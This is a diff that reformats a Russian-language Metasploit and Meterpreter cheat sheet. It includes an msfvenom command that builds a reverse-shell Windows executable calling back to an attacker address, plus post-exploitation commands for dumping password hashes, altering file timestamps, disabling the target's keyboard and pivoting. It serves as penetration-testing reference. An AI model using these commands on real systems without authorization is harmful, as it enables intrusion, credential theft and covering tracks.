@@ -6,45 +6,44 @@
 * msf > use exploit/[ExploitPath]
 Укажите полезную нагрузку для использования:
 
-msf > set PAYLOAD [PayloadPath]
+* msf > set PAYLOAD [PayloadPath]
 Показать параметры для текущих модулей:
 
-msf > show options
+* msf > show options
 Установить параметры:
 
-msf > set [Option] [Value]
+* msf > set [Option] [Value]
 Запустить эксплойт:
 
-msf > exploit 
+* msf > exploit 
 Полезные вспомогательные модули
 Сканер портов:
 
-msf > use auxiliary/scanner/portscan/tcp
-msf > set RHOSTS 10.10.10.0/24
-msf > run
+* msf > use auxiliary/scanner/portscan/tcp
+* msf > set RHOSTS 10.10.10.0/24
+* msf > run
 Перечисление DNS:
 
-msf > use auxiliary/gather/dns_enum
-msf > set DOMAIN target.tgt
-msf > run
+* msf > use auxiliary/gather/dns_enum
+* msf > set DOMAIN target.tgt
+* msf > run
 FTP Сервер:
 
-msf > use auxiliary/server/ftp
-msf > set FTPROOT /tmp/ftproot
-msf > run
+* msf > use auxiliary/server/ftp
+* msf > set FTPROOT /tmp/ftproot
+* msf > run
 Proxy Сервер:
 
-msf > use auxiliary/server/socks4
-msf > run 
-msfvenom :
+* msf > use auxiliary/server/socks4
+* msf > run 
+* msfvenom :
 
-Инструмент msfvenom можно использовать для генерации полезных нагрузок Metasploit (например, Meterpreter) в виде отдельных файлов и, при необходимости, для их кодирования.
-
+#### Инструмент msfvenom можно использовать для генерации полезных нагрузок Metasploit (например, Meterpreter) в виде отдельных файлов и, при необходимости, для их кодирования.
 Этот инструмент заменяет прежние инструменты msfpayload и msfencode.
 
 Запустите с ‘-l payloads’, чтобы получить список полезных нагрузок.
 
-$ msfvenom –p [PayloadPath]
+* $ msfvenom –p [PayloadPath]
 –f [FormatType]
 LHOST=[LocalHost (if reverse conn.)]
 LPORT=[LocalPort]
@@ -52,79 +51,79 @@ LPORT=[LocalPort]
 
 Полезная нагрузка Reverse Meterpreter в виде исполняемого файла и перенаправленная в файл:
 
-$ msfvenom -p windows/meterpreter/
+* $ msfvenom -p windows/meterpreter/
 reverse_tcp -f exe LHOST=10.1.1.1
 LPORT=4444 > met.exe
 Metasploit Meterpreter
 Базовые команды:
 
-? / help: вывод сводной информации о командах
-exit / quit: выход из сеанса Meterpreter
-sysinfo: показать имя системы и тип ОС
-shutdown / reboo: не требует пояснений
+* ? / help: вывод сводной информации о командах
+* exit / quit: выход из сеанса Meterpreter
+* sysinfo: показать имя системы и тип ОС
+* shutdown / reboo: не требует пояснений
 Команды файловой системы:
-cd: изменить каталог
-lcd: Изменить каталог на локальном (атакующем) компьютере
-pwd / getwd: Показать текущий рабочий каталог
-ls: показать содержимое каталога
-cat: отображать содержимое файла на экране
-download / upload: перемещение файлов на / с целевого компьютера
-mkdir / rmdir: создать / удалить каталог
-edit: открыть файл в редакторе по умолчанию (обычно vi)
+* cd: изменить каталог
+* lcd: Изменить каталог на локальном (атакующем) компьютере
+* pwd / getwd: Показать текущий рабочий каталог
+* ls: показать содержимое каталога
+* cat: отображать содержимое файла на экране
+* download / upload: перемещение файлов на / с целевого компьютера
+* mkdir / rmdir: создать / удалить каталог
+* edit: открыть файл в редакторе по умолчанию (обычно vi)
 Команды процесса:
-getpid: Показать идентификатор процесса, внутри которого работает Meterpreter.
-getuid: Показать идентификатор пользователя, с которым работает Meterpreter.
-ps: Показать список процессов.
-kill: завершить процесс по его идентификатору.
-execute: запустить заданную программу с правами процесса, в который загружен Meterpreter.
-migrate: переход к указанному идентификатору процесса назначения:
+* getpid: Показать идентификатор процесса, внутри которого работает Meterpreter.
+* getuid: Показать идентификатор пользователя, с которым работает Meterpreter.
+* ps: Показать список процессов.
+* kill: завершить процесс по его идентификатору.
+* execute: запустить заданную программу с правами процесса, в который загружен Meterpreter.
+* migrate: переход к указанному идентификатору процесса назначения:
 Целевой процесс должен иметь такие же или меньшие привилегии
 Целевой процесс может быть более стабильным
 Находясь внутри процесса, может получить доступ к любым файлам, для которых процесс заблокирован
 Сетевые команды:
 
-ipconfig: Показать информацию о сетевом интерфейсе
-portfwd: пересылка пакетов через сеанс TCP
-route: управление / просмотр таблицы маршрутизации системы
+* ipconfig: Показать информацию о сетевом интерфейсе
+* portfwd: пересылка пакетов через сеанс TCP
+* route: управление / просмотр таблицы маршрутизации системы
 Разные команды:
 
-idletime: отображение времени, в течение которого GUI целевой машины простаивал.
-uictl [enable/disable] [keyboard/mouse]: включить / отключить мышь или клавиатуру целевой машины.
-screenshot: Сохранить как изображение снимок экрана целевой машины.
+* idletime: отображение времени, в течение которого GUI целевой машины простаивал.
+* uictl [enable/disable] [keyboard/mouse]: включить / отключить мышь или клавиатуру целевой машины.
+* screenshot: Сохранить как изображение снимок экрана целевой машины.
  
 
 Дополнительные модули:
 
-use [module]: загрузить указанный модуль
+* use [module]: загрузить указанный модуль
 Пример:
-use priv: загрузить модуль priv
+* use priv: загрузить модуль priv
 
-hashdump: сбросить хэши из коробки
-timestomp: Изменить временные метки файла NTFS
+* hashdump: сбросить хэши из коробки
+* timestomp: Изменить временные метки файла NTFS
 Управление сессиями
 
 Многократная эксплуатация:
 
 Запустите эксплойт, ожидая одну сессию, которая сразу же станет фоновой:
 
-msf > exploit -z
+* msf > exploit -z
 Запустите эксплойт в фоновом режиме, ожидая одну или несколько сессий, которые сразу же станут фоновыми:
 
-msf > exploit –j
+* msf > exploit –j
 Перечислите все текущие задания (обычно используют слушателей):
 
-msf > jobs –l
+* msf > jobs –l
 Убить задание
 
-msf > jobs –k [JobID]
+* msf > jobs –k [JobID]
 Несколько сессий:
 
 Перечислите все фоновые сессии:
 
-msf > sessions -l
+* msf > sessions -l
 Взаимодействовать с фоновым сеансом:
 
-msf > session -i [SessionID]
+* msf > session -i [SessionID]
 Предыстория текущего интерактивного сеанса:
 
 meterpreter > <Ctrl+Z>
@@ -134,5 +133,5 @@ meterpreter > background
 
 Все модули (эксплойты / post / aux) против целевой маски подсети будут поворачиваться в течение этого сеанса.
 
-msf > route add [Subnet to Route To]
+* msf > route add [Subnet to Route To]
 [Subnet Netmask] [SessionID]
